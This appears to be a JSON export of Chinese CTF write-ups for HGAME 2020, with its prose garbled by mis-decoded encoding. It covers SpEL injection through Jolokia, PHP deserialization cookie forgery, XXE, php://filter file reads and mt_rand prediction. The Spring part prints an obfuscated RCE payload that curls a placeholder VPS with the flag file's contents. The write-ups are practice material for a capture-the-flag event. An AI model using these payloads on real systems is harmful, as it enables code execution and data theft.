\"value\": \"admin\"\n                },\n                \"blacklist\": {\n                    \"value\": \"\"\n                },\n                \"endpoint\": {\n                    \"value\": \"\"\n                },\n                \"endpoints\": {\n                    \"value\": \"\"\n                },\n                \"encParam2\": {\n                    \"value\": \"spppelandjookiaa\"\n                },\n                \"encParam1\": {\n                    \"value\": \"hgamehgamehgame{\"\n                },\n                \"application\": {\n                    \"value\": \"\"\n                },\n                \"keywords\": {\n                    \"value\": \"\"\n                },\n                \"management\": {\n                    \"value\": \"\"\n                },\n                \"enabled\": {\n                    \"value\": \"false\"\n                },\n                \"port\": {\n                    \"value\": \"9997\"\n                },\n                \"spring\": {\n                    \"value\": \"\"\n                },\n                \"debug\": {\n                    \"value\": \"true\"\n                },\n                \"shutdown\": {\n                    \"value\": \"\"\n                },\n                \"server\": {\n                    \"value\": \"\"\n                },\n                \"jolokia\": {\n                    \"value\": \"\"\n                },\n                \"exposure\": {\n                    \"value\": \"\"\n                },\n                \"config\": {\n                    \"value\": \"\"\n                },\n                \"user\": {\n                    \"value\": \"\"\n                },\n                \"name\": {\n                    \"value\": \"\"\n                }\n            }\n        }\n```\nç”±æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“blacklistå’ŒåŠ å¯†è§£å¯†ä¸­çš„2ä¸ªå‚æ•°\nå†è®¿é—®\nhttp://ezspel.hgame.wz22.cc/actuator/jolokia/list\næˆ‘ä»¬å†æ¥æœä¸€æœå‡ºé¢˜äººçš„åå­—(jqy)å¾ˆå®¹æ˜“å°±æ‰¾åˆ°äº†å…³é”®éƒ¨åˆ†(å¼€ç©ç¬‘çš„ï¼Œä¸€å¼€å§‹æ˜¯è‚‰çœ¼æ‰¾çš„ï¼Œçœ‹è§encryptçš„å­—æ ·æ„Ÿè§‰æ¯”è¾ƒæ•æ„Ÿæ‰æ‰¾åˆ°çš„)\n![](wp4_img/2.jpg)\næ ¹æ®å‡ºé¢˜äººæä¾›çš„ä¸¤ä»½èµ„æ–™ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ payloadæ¥æ‰§è¡Œå‘½ä»¤è¯»å–flagï¼Œè€ŒåŠ å¯†ä¸è§£å¯†é’ˆå¯¹çš„æ˜¯rememberMeï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨å…¶ä¸­æ›¿æ¢rememberMeçš„å€¼  \nå…ˆæ”¾å‡ºpayload\n```\n{\n   \"type\":\"EXEC\",\n   \"mbean\":\"com.jqy.ezspel:Name=EncryptService\",\n   \"operation\":\"encrypt\",\n   \"arguments\":[\"hgamehgamehgame{\",\"spppelandjookiaa\",\"#{T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),new String[]{\\\"/bin/bash\\\",\\\"-c\\\",\\\"curl http://_yourVPS:_apachePort/?flag=`cat flag`|base64\\\"})}\"]\n}\n```\nç°åœ¨è§£é‡Šä¸‹ç¬¬ä¸‰ä¸ªargs  \nå› ä¸ºé»‘åå•çš„é™åˆ¶ï¼Œæˆ‘ä»¬é€‰æ‹©å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡é»‘åå•çš„æ£€æµ‹ï¼Œè¿™é‡Œçš„é»‘åå•æ¯”å‡ºé¢˜äººæä¾›çš„èµ„æ–™é‡Œå¢åŠ äº†forNameå’ŒgetClass,è¿™ä¿©çš„ä½œç”¨æ˜¯åŠ è½½ç±»,è¿™é‡Œæˆ‘ä»¬ç”¨ClassLoaderä»£æ›¿ï¼Œäºæ˜¯å°±æœ‰*ClassLoader.getSystemClassLoader().loadClass()*ï¼Œä¸ºäº†è½¬æ¢ä¸ºSpELçš„å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦*#{T(ClassLoader).getSystemClassLoader().loadClass()}*  \n\n(ç…§æ¬å‡ºé¢˜äººåŸè¯)  \nå…³äºinvokeï¼š  \nåœ¨Javaä¸­,æ–¹æ³•å¯ä»¥å½“åšMethodç±»çš„ä¸€ä¸ªå¯¹è±¡æ¥çœ‹å¾…ã€‚  \n*a.print(b)==print.invoke(a,b)*  \nprintæ˜¯ä¸ªå˜é‡ï¼Œå®šä¹‰ä¸º*Method print=A.class.getMethod(\"print);*  \nå°±æ˜¯è·å–ç±»Aé‡Œé¢çš„è¿™ä¸ªprintæ–¹æ³•  \n\nflagåœ¨æ ¹ç›®å½•ä¸‹æ‰€ä»¥ç›´æ¥cat flagï¼Œbase64ç¼–ç æ˜¯å› ä¸ºæŸäº›ç‰¹æ®Šå­—ç¬¦å¯èƒ½æ— æ³•æ˜¾ç¤º  \nå…ˆè¿›è¡ŒåŠ å¯†ï¼Œå› ä¸ºä¹‹åç½‘ç«™ä¼šå¯¹rememberMeçš„å€¼è¿›è¡Œè‡ªåŠ¨è§£å¯†ï¼Œå°†ä»¥ä¸Špayloadä»¥JSONå½¢å¼postè‡³http://ezspel.hgame.wz22.cc/actuator/jolokia\næ­¤æ—¶vpsæ˜¯æ²¡æœ‰æ¥æ”¶åˆ°æ•°æ®çš„ï¼Œå› ä¸ºç°åœ¨åªæ˜¯å¯¹æ•°æ®è¿›è¡Œäº†ä¸€ä¸ªåŠ å¯†å¤„ç†ï¼Œç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹response\n![](wp4_img/6.png)\nvalueæ‰€æŒ‡çš„å°±æ˜¯åŠ å¯†åçš„æ•°æ®ï¼Œæˆ‘ä»¬æŠŠå®ƒæ”¾è¿›cookieä¸­çš„rememberMeä¸­,ç„¶åç›´æ¥GETè®¿é—®http://ezspel.hgame.wz22.cc/\nå°±å¥½ï¼Œåœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹apacheæ—¥å¿—å°±å¯ä»¥çœ‹è§base64ç¼–ç åçš„flag\n\n### ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ\næ„Ÿè§‰è¿™é¢˜æ˜¯æœ€éš¾çš„- -  \n[official_wp](https://github.com/vidar-team/Hgame2020_writeup/tree/master/week4)\n[HGAME 2020 Week 4 WEBâ€ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒâ€ Writeup](https://www.gem-love.com/websecurity/1566.html)\n\nè¿™ä¸ªçœ‹è§æˆªåŒ…æ—¶çš„dataæ˜¯xmlå½¢å¼çš„ï¼Œå¹¶ä¸”æ— å›æ˜¾ï¼Œæœ‰æƒ³åˆ°å¯èƒ½æ˜¯BlindXXE,ä½†æ˜¯å‘¢- -æˆ‘å‘ç°è¾“å…¥'<'æ—¶ï¼Œè¿”å›çš„åŒ…ä¼šæ˜¾ç¤ºerror(ç„¶è€Œè¿™é‡Œæ˜¯æˆ‘- -dataæ•°æ®ä¸å®Œæ•´é€ æˆçš„)  \n[SSRF](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)  \næˆ‘çš„ç†è§£æ˜¯è¦æ”»å‡»å†…ç½‘æ‰€ä»¥è¦è·å¾—æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯ï¼Œä¿¡æ¯ä¿å­˜åœ¨/etc/hostsä¸­\nç„¶åç”¨phpä¼ªåè®®è¯»å–æ–‡ä»¶ä¿¡æ¯  \n[XMLä¸xxeæ³¨å…¥åŸºç¡€çŸ¥è¯†](https://www.cnblogs.com/backlion/p/9302528.html)  \n[æ€»ç»“ä¸‹è¿™å‡ å¤©æ‰¹é‡xxeé‡åˆ°çš„å‘](https://wh0ale.github.io/2019/05/09/2019-5-9-%E6%80%BB%E7%BB%93%E4%B8%8B%E8%BF%99%E5%87%A0%E5%A4%A9%E6%89%B9%E9%87%8Fxxe%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/)  \n[å¯¹äºXXEæ¼æ´çš„å­¦ä¹ ä¸å®éªŒå¤ç°è®°å½•](https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/)  \nåº”è¯¥æ˜¯hitcon2017çš„babyfirstæ”¹çš„\nä¹‹å‰çŠ¯è¿‡ä¸€ä¸ªå°é”™è¯¯å¯¼è‡´æœåŠ¡å™¨æ¥æ”¶ä¸åˆ°ä¿¡æ¯- -ï¼ŒåŸå› æ˜¯æ²¡æœ‰æŠŠdtdæ–‡ä»¶æ”¾åœ¨æ ¹ç›®å½•ä¸‹ï¼Œå¯¼è‡´æ— æ³•è¯»å–- -ï¼Œè¿™ä¸ªé—®é¢˜æœ¬è´¨æ˜¯å› ä¸ºæˆ‘è¿˜ä¸ç†è§£è¿™ä¸ªpayloadæ˜¯å’‹å›äº‹- -  \n \n```php\n<?php\nerror_reporting(0);\n\n$token = @$_GET['token'];\nif (!isset($token)) {\n    die(\"è¯·å¸¦ä¸Šæ‚¨çš„é˜Ÿä¼tokenè®¿é—®! /?token=\");\n}\n$api = \"http://checker/?token=\".$token;\n$t = file_get_contents($api);\nif($t !== \"ok\") {\n    die(\"é˜Ÿä¼tokené”™è¯¯\");\n}\n\nhighlight_file(__FILE__);\n\n$sandbox = '/var/www/html/sandbox/'. md5(\"hgame2020\" . $token);;\n@mkdir($sandbox);\n@chdir($sandbox);\n\n$content = $_GET['v'];\nif (isset($content)) {\n    $cmd = substr($content,0,5);\n    system($cmd);\n}else if (isset($_GET['r'])) {\n    system('rm -rf ./*');\n}\n\n/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _\n  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |\n | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |\n  \\___ \\|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |\n  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|\n |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)\n                                    |/\n\n*/\n```\n[å¦‚ä½•åœ¨å‘½ä»¤é•¿åº¦å—é™çš„æƒ…å†µä¸‹æˆåŠŸgetåˆ°webshell](https://www.cnblogs.com/ECJTUACM-873284962/p/9452263.html)  \n\n= =è¿™é¢˜è¿˜æ˜¯æ²¡ææ‡‚\n","tags":["vidar"]},{"title":"hgame2020week3_wp","url":"/2020/02/14/hgame2020week3-wp/","content":"è¿™å‘¨qwqåŸºæœ¬ç­‰äºæ²¡æœ‰åœ¨å†™é¢˜...\n\n# web\n## åºåˆ—ä¹‹äº‰\nå•Š...åŸæ¥æ˜¯è¦å¾—åˆ°  \n```php\nprivate $encryptKey = 'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW';\n```\nè¿™é‡Œçš„encryptKey QAQ  \n```php\nclass Game\n{   \n    private $encryptKey = 'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW';\n    public $welcomeMsg = '%s, Welcome to Ordinal Scale!';\n\n    private $sign = '';\n    public $rank;\n\n    public function __construct($playerName){\n        $_SESSION['player'] = $playerName;\n        if(!isset($_SESSION['exp'])){\n            $_SESSION['exp'] = 0;\n        }\n        $data = [$playerName, $this->encryptKey];\n        $this->init($data);\n        $this->monster = new Monster($this->sign);\n        $this->rank = new Rank();\n    }\n\n    private function init($data){\n        foreach($data as $key => $value){\n            $this->welcomeMsg = sprintf($this->welcomeMsg, $value);\n            $this->sign .= md5($this->sign . $value);\n        }\n    }\n}\n```\nçœ‹äº†hint,ä¼ å…¥player=%sä»¥æ­¤æ¥å¾—åˆ°$encryptKey  \n```php\nclass Rank\n{\n    private $rank;\n    private $serverKey;     // æœåŠ¡å™¨çš„ Key\n    private $key = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';\n\n    public function __construct(){\n        if(!isset($_SESSION['rank'])){\n            $this->Set(rand(2, 1000));\n            return;\n        }\n\n        $this->Set($_SESSION['rank']);\n    }\n\n    public function Set($no){\n        $this->rank = $no;\n    }\n\n    public function Get(){\n        return $this->rank;\n    }\n\n    public function Fight($monster){\n        if($monster['no'] >= $this->rank){\n            $this->rank -= rand(5, 15);\n            if($this->rank <= 2){\n                $this->rank = 2;\n            }\n\n            $_SESSION['exp'] += rand(20, 200);\n            return array(\n                'result' => true, \n                'msg' => '<span style=\"color:green;\">Congratulations! You win! </span>'\n            );\n        }else{\n            return array(\n                'result' => false, \n                'msg' => '<span style=\"color:red;\">You die!</span>'\n            );\n        }\n    }\n\n    public function __destruct(){\n        // ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼\n        $this->serverKey = $_SERVER['key'];\n        if($this->key === $this->serverKey){\n            $_SESSION['rank'] = $this->rank;\n        }else{\n            // éæ­£å¸¸è®¿é—®\n            session_start();\n            session_destroy();\n            setcookie('monster', '');\n            header('Location: index.php');\n            exit;\n        }\n    }\n}\n\nclass Monster\n{\n    private $monsterData;\n    private $encryptKey;\n\n    public function __construct($key){\n        $this->encryptKey = $key;\n        if(!isset($_COOKIE['monster'])){\n            $this->Set();\n            return;\n        }\n\n        $monsterData = base64_decode($_COOKIE['monster']);\n        if(strlen($monsterData) > 32){//32æ˜¯æŒ‡md5çš„ä½æ•°\n            $sign = substr($monsterData, -32);\n            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);\n            if(md5($monsterData . $this->encryptKey) === $sign){\n                $this->monsterData = unserialize($monsterData);\n            }else{\n                session_start();\n                session_destroy();\n                setcookie('monster', '');\n                header('Location: index.php');\n                exit;\n            }\n        }\n        \n        $this->Set();     \n    }\n\n    public function Set(){\n        $monsterName = ['æ— åå°æ€ª', 'BOSS: The Kernal Cosmos', 'å°æ€ª: Big Eggplant', 'BOSS: The Mole King', 'BOSS: Zero Zone Witch'];\n        $this->monsterData = array(\n            'name' => $monsterName[array_rand($monsterName, 1)],\n            'no' => rand(1, 2000),\n        );\n        $this->Save();\n    }\n\n    public function Get(){\n        return $this->monsterData;\n    }\n\n    private function Save(){\n        $sign = md5(serialize($this->monsterData) . $this->encryptKey);\n        setcookie('monster', base64_encode(serialize($this->monsterData) . $sign));\n    }\n}\n```\n```php\n  <main role=\"main\" class=\"inner cover\">\n    <h2 class=\"cover-heading\"><?php echo($game->welcomeMsg);?></h2>\n    <h1># <?php echo($game->rank->Get());?></h1>\n    <?php if($game->rank->Get() === 1){?>\n        <h2>hgame{flag_is_here}</h2>\n    <?php }?>\n    <br>\n    ```\nåœ¨Monsterç±»é‡Œæœ‰ååºåˆ—åŒ–å‡½æ•°unserialize(),è€Œé‡Œé¢ä¼ å…¥çš„å†…å®¹æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„cookie,æ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥ä½¿å¾—this->rank()==1ã€‚å…³äºè¿›å…¥unserialize()ä¹‹å‰æ‰€è¦è¾¾åˆ°çš„æ¡ä»¶ï¼Œå…¶å®æ‰§è¡Œä¸€éMonsterç±»é‡ŒSave()å‡½æ•°çš„å†…å®¹å°±å¯ä»¥äº†:\n```php\n<?php\nerror_reporting(0);\nsession_start();\n\nclass Game\n{   \n    private $encryptKey = 'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL';\n\n    private $sign = '';\n    public $rank;\n\n    public function __construct(){\n        $data = [1, $this->encryptKey];\n        $this->init($data);\n    }\n\n    private function init($data){\n        foreach($data as $key => $value){\n            $this->sign .= md5($this->sign . $value);\n            \n        }\n        print($this->sign);\n    }\n}\n\nclass Rank\n{\n\n    private $rank;\n    public function __construct(){\n        $this->rank = $no;\n        if(!isset($_SESSION['rank'])){\n            $_SESSION['rank'] = 1;\n        }\n\n        $this->Set($_SESSION['rank']);\n    }\n\n    public function Set($no){\n        \n    }\n\n}\nnew Game();\n$res1=serialize(new Rank());\n//print($res1);\n$key='c4ca4238a0b923820dcc509a6f75849b4eb38c8d89d42dd45200003c8b7101c6';\n$sign = md5($res1 . $key);\nsetcookie('monster', base64_encode($res1 . $sign));\necho \"<br>\";\nprint($_COOKIE['monster']);\n?>\n```\nä¹‹åburpsuiteæ‹¦æˆªæ”¹cookieçš„å€¼å°±å¯ä»¥äº†\n\n# misc\n## ä¸‰é‡éšå†™\næ ¹æ®You konw LSB.wavå…ˆç”¨silentEyeæŠŠwavè§£ç ï¼Œå‡ºç°key,ç”¨æ¥è§£çœ‹èµ·æ¥å¾ˆå¤é£çš„mp3ï¼Œå¾—åˆ°flag.cryptoï¼Œå¦ä¸€ä¸ªmp3çš„å›¾åƒæ˜¯ä¸ªæ¡å½¢ç ï¼Œåœ¨çº¿è§£ç ä¸€ä¸‹ã€‚æ ¹æ®æä¾›çš„å·¥å…·ï¼ŒæŠŠæ¡å½¢ç è§£ç å‡ºçš„å†…å®¹ä½œä¸º.cryptoçš„keyå°±å¯ä»¥å¾—åˆ°flag\n\n# èµ›å\n## web\n### äºŒå‘å…¥é­‚\nå®˜æ–¹wpç»™çš„èµ„æ–™(èƒ½è¯»è‹±æ–‡æ–‡ç« çœŸæ˜¯ä¸€é¡¹å¾ˆé‡è¦çš„æŠ€èƒ½...)\n[BREAKING PHP'S MT_RAND() WITH 2 VALUES AND NO BRUTEFORCE](https://www.ambionics.io/blog/php-mt-rand-prediction)\n[ä¸­æ–‡ç¿»è¯‘ç‰ˆ](https://nosec.org/home/detail/3876.html)\n[reverse_mt_rand.py](https://github.com/ambionics/mt_rand-reverse/blob/master/reverse_mt_rand.py)\nè„šæœ¬æµç¨‹æ˜¯ï¼Œå…ˆè®¿é—®https://twoshot.hgame.n3ko.co/random.php?times=228\nä¹Ÿå°±æ˜¯æŠ½å¡228æ¬¡\nä¹‹ååˆ©ç”¨ä¸Šé¢çš„è„šæœ¬ï¼Œæœ‰å¦‚ä¸‹\n```\npy -3 ./reverse_mt_rand.py randnum[0] randnum[227] 0 0\n```\næ‰€äº§ç”Ÿçš„å€¼å°±æ˜¯seedï¼Œä¹Ÿå°±æ˜¯cdkey\nåˆ©ç”¨os.popen()æ–¹æ³•å‘https://twoshot.hgame.n3ko.co/verify.php\npostä»¥ä¸Špayloadå°±å¯ä»¥å¾—åˆ°è¿”å›ç»“æœ\n\n### Cosmosçš„äºŒæ‰‹å¸‚åœº\n![](00.png)\nè¿›è¡Œäº¤æ˜“æ—¶å®¹æ˜“å½¢æˆæ¡ä»¶ç«äº‰  \né‚£ä¹ˆæˆ‘ä»¬å…ˆè´­å…¥ä¸€ä»¶å•†å“ï¼Œåœ¨å‡ºå”®çš„æ—¶å€™å½¢æˆæ¡ä»¶ç«äº‰ï¼Œåœ¨åº“å­˜è¿˜æœªæ¥å¾—åŠå˜åŒ–çš„æƒ…å†µä¸‹å°†ç»Ÿä¸€å•†å“åå¤å‡ºå”®ï¼Œä¹‹åå†™ä¸ªè„šæœ¬(ä¸çŸ¥é“ä¸ºå•¥ç”¨burpsuiteé’±è¿˜æ˜¯æ²¡å˜åŒ–- -)\n[pythonï¼šthreading.Threadç±»çš„ä½¿ç”¨è¯¦è§£](https://blog.csdn.net/drdairen/article/details/60962439)\nè„šæœ¬çš„æ„æˆæ˜¯ï¼Œå¯¹äºbuyå’Œsolveè¿™ä¸¤ä¸ªè¡Œä¸ºå®šä¹‰ä¸¤ä¸ªå‡½æ•°ï¼Œä¼ å…¥cookieå€¼ä»¥åŠdata(dataä¸­åŒ…å«äº†commodityä¿¡æ¯-code&amount)ï¼Œåé¢åˆ©ç”¨threading.Threadç±»è¿›è¡Œå¤šçº¿ç¨‹(- -)  \n  \n  ä¹‹åä¸æ‰“ç®—å†™äº†- -å¾ˆå¤šé¢˜ä¹Ÿæœ‰å¾ˆè¯¦ç»†çš„wpäº†ï¼Œæœ¬è´¨ä¸Šæˆ‘ä¹Ÿæ˜¯çœ‹wpå¤ç°çš„(æ˜¯çš„å°±æ˜¯è¿™ä¹ˆèœ)\n\n### Cosmosçš„ç•™è¨€æ¿-2\n\n[sqlç›²æ³¨ä¹‹æ—¶é—´ç›²æ³¨](https://www.lsablog.com/networksec/penetration/time-based-blind-sqli/)\n\n### Cosmosçš„èŠå¤©å®¤2.0\nscriptè¢«è¿‡æ»¤ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡ã€‚è¾“å…¥åæ§åˆ¶å°å‘ç°å¼‚å¸¸\n```\nRefused to execute inline script because it violates the following Content Security Policy directive: \"script-src 'self'\". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.\n```\nkey word:CSP\n[CTF|æœ‰å…³CSPç»•è¿‡çš„æ–¹æ³•](https://zhuanlan.zhihu.com/p/94246164)","tags":["vidar"]},{"title":"hgame2020week2_wp","url":"/2020/02/14/hgame2020week2-wp/","content":"å‡‰äº†å•Šå‡‰äº†å•Š  \n# Reverse\n## babyPy\nä¸‹è½½æ–‡ä»¶æ˜¯ä¸ªå­—èŠ‚ç ï¼Œæ‰‹åŠ¨ç¿»è¯‘ä¸€ä¸‹ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­  \n[å‚è€ƒç½‘å€](https://anhkgg.com/python-bytecode/)  \n```Python\ntmp1=flag[::-1]\ntmp2=list(tmp1)\nfor i in range(1,len(tmp2)):\n\ttmp3=tmp2[i-1]^tmp2[i]       \n\ttmp2[i]=tmp3\n\nres=bytes(tmp2).hex\nprint(res)\n```\næ ¹æ®å¼‚æˆ–å…¬å¼ï¼Œå¯å¾—m[i]= cipher[i] ^ cipher[i-1]  \näºæ˜¯æœ‰å¦‚ä¸‹  \n```Python\ncipher=bytes().fromhex('7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22')\n_cipher=list(cipher)\nm=b'}                                        '\n_m=list(m)\nfor i in range(1,len(_cipher)):\n\ttmp=_cipher[i]^_cipher[i-1]\n\t_m[i]=tmp\nflag=bytes(_m[::-1])\nprint(flag)\n```\n# Crypto\n## Verfication_code\nç”±æºç å¾—sha256(xxxx+å·²çŸ¥å­—ç¬¦ä¸²)=å·²çŸ¥å¯†æ–‡ï¼Œçˆ†ç ´æ±‚xxxxï¼Œè¾“å…¥åå†è¾“å…¥I like playing Hgame\n```Python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport socketserver\nimport os, sys, signal\nimport string, random\nfrom hashlib import sha256\nimport itertools\n\nmyStr='L0ZzlogdBWx1hlXC'\ndstDigest='236abe814ce3691e1d5959bd36b79ca31e3d31b6daf941fa60d2fb7f9a01b61d'\n\nfor i in itertools.permutations(string.ascii_letters+string.digits,4):\n\tproof=''.join(i)+myStr\n\tdigest=sha256(proof.encode()).hexdigest()\n\tif(digest==dstDigest):\n\t\tprint(i)\n```\n# Misc\n## Cosmosçš„åˆé¤\n(æ„Ÿè°¢å‡ºé¢˜äººçš„è€å¿ƒè§£ç­”)  \nä¸€å¼€å§‹ä»¥ä¸ºåœ¨æµé‡åŒ…é‡Œæ‰¾pngæˆ–è€…jpegä¹‹ç±»çš„ï¼Œä½†æ˜¯ç›¸å…³çš„æå–å‡ºæ¥æ„Ÿè§‰ä¸å¤ªå¯¹åŠ²...ï¼ˆæ ¹æ®é¢˜ç›®å›¾ç‰‡åº”è¯¥æ˜¯äºŒæ¬¡å…ƒå¦¹å­...)  \nå…ˆæŠŠlogå¯¼å…¥è§£å¯†ï¼Œåœ¨httpä¸­æ‰¾ï¼Œå‘ç°ä¸€ä¸ªæ¯”è¾ƒä¸ä¸€æ ·çš„åŒ…  \n![](wp2_img/01.png)\nç‚¹è¿›å»çœ‹çœ‹å‘ç°å«æœ‰zipæ–‡ä»¶æ ¼å¼ï¼Œå¯¼å‡ºæ¥çœ‹ä¸‹é‡Œè¾¹æœ‰å¼ å›¾ç‰‡ï¼Œæç¤ºç”¨outguessï¼Œå¹¶ä¸”å¤‡æ³¨é‡Œç»™äº†keyï¼Œç„¶åè§£å¯†ä¸‹å°±å¥½ï¼Œè§£å®Œäº†æ˜¯ä¸ªç½‘å€ï¼Œä¸‹è½½ä¸‹æ¥ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œè¾¹çš„å›¾ç‰‡äºŒç»´ç æ‰«ä¸€ä¸‹å°±è¡Œ\n## æ‰€è§å³ä¸ºå‡\nå‘ç°7zå¯ä»¥ç›´æ¥è§£å‹ï¼Œæ³¨é‡Šä¸­çš„F5 keyæç¤ºäº†F5éšå†™ï¼Œäºæ˜¯åˆ©ç”¨F5-steganography\n```\njava Extract ./11.jpg -e res -p NllD7CQon6dBsFLr\n```\nå¾—åˆ°hexæ–‡æœ¬ï¼Œå¤åˆ¶è¿›winhexå¯å¾—flag\n## åœ°çƒä¸Šæœ€åçš„å¤œæ™š\nè§£å‹å¾—no password.pdfï¼Œæƒ³åˆ°pdféšå†™ï¼Œç”¨wbStego4.3openè§£ç å¾—åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé‡Œè¾¹å†™ç€zipçš„è§£å‹å¯†ç ï¼Œè§£å‹å¾—ä¸€ä¸ªdocæ–‡ä»¶ï¼Œè¯•è¯•è½¬æˆxmlï¼Œç”¨7zå¯¹docè§£å‹åè¿›å…¥wordæ–‡ä»¶å¤¹ï¼Œå‘ç°secret.xmlï¼Œæ‰“å¼€å°±æ˜¯flag\n## ç©ç©æ¡ç \nä¸‹è½½å¾—ä¸€ä¸ªzipï¼Œé‡Œè¾¹æ³¨é‡Š:Decode JPNPostCode to get MSUStegoVideo password  \nä¿©æ–‡ä»¶å¯¹åº”æ³¨é‡Šé‡Œè¾¹å†…å®¹ï¼Œå…ˆçœ‹postcodeï¼Œè¿™æ˜¯ä¸ªæ—¥æœ¬çš„é‚®æ”¿ç¼–ç ï¼Œæˆ‘æ˜¯åœ¨ç”Ÿæˆæ¡ç ç½‘ç«™ä¸Šæ‰‹åŠ¨å¯¹æ¯”ï¼Œä¸€ä¸ªä¸ªè¯•çš„ï¼Œä¸è¿‡ä¹Ÿä¸å¤æ‚ï¼Œæœ‰è§„å¾‹    \n[æ—¥æœ¬é‚®æ”¿æ¡å½¢ç ç”Ÿæˆå™¨](https://cn.online-qrcode-generator.com/japanpost-barcode-generator)  \n![](wp2_img/00.png)\nç¬¬äºŒä¸ªï¼Œæ ¹æ®æç¤ºä¸‹äº†virtualdub2ï¼Œå†å®‰MSU StegoVideo æ’ä»¶ï¼Œè¿™ä¸ªåªèƒ½è¿è¡Œ32ä½çš„ï¼Œæ‰“å¼€åæ ¹æ®ç½‘ä¸Šæ•™ç¨‹ï¼Œè¾“å…¥ä¸Šä¸€æ­¥éª¤æ‰€å¾—çš„ç è¿›è¡Œè§£ç ï¼Œ[ä½¿ç”¨ MSU StegoVideo](https://blog.csdn.net/wy_bk/article/details/85217583)  \næ‰“å¼€txtæ–‡ä»¶å¯å¾—zipå¯†ç ï¼Œ7zè§£å‹åå¾—æ¡å½¢ç ï¼Œåœ¨çº¿æ‰«ä¸€ä¸‹å°±å¥½\n[Free Online Barcode Reader](https://online-barcode-reader.inliteresearch.com/)  \n# èµ›åå¤ç°\n## web\n### Cosmosçš„åšå®¢åå°\nçœ‹åˆ°http://cosmos-admin.hgame.day-day.work/?action=login.php\nè¿™æ ·çš„å­—æ ·ï¼Œæƒ³åˆ°å¯èƒ½æ˜¯phpä¼ªåè®®  \n[æ–‡ä»¶åŒ…å«æ¼æ´ä¸phpä¼ªåè®®](https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/)  \näºæ˜¯è¾“å…¥http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php\nè§£ç åå¾—åˆ°æºç \n```php\n<?php\ninclude \"config.php\";\nsession_start();\n\n//Only for debug\nif (DEBUG_MODE){\n    if(isset($_GET['debug'])) {\n        $debug = $_GET['debug'];\n        if (!preg_match(\"/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\", $debug)) {\n            die(\"args error!\");\n        }\n        eval(\"var_dump($$debug);\");\n    }\n}\n\nif(isset($_SESSION['username'])) {\n    header(\"Location: admin.php\");\n    exit();\n}\nelse {\n    if (isset($_POST['username']) && isset($_POST['password'])) {\n        if ($admin_password == md5($_POST['password']) && $_POST['username'] === $admin_username){\n            $_SESSION['username'] = $_POST['username'];\n            header(\"Location: admin.php\");\n            exit();\n        }\n        else {\n            echo \"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯\";\n        }\n    }\n}\n?>\n```\nå¯ä»¥æ³¨æ„åˆ°\n```\neval(\"var_dump($$debug);\");\n```\neval()ä¸$$debugéƒ½æ˜¯éœ€è¦æ³¨æ„çš„ç‚¹  å¯¹äº$$debugæ¥è¯´,åœ¨è¿™é‡Œæˆ‘ä»¬çš„$$debugå°±æ˜¯å¯å˜å˜é‡,åœ¨è¿™é‡Œ$$debugå°±è¡¨ç¤º$($debugçš„å€¼),åŒæ—¶$GLOBALS â€” 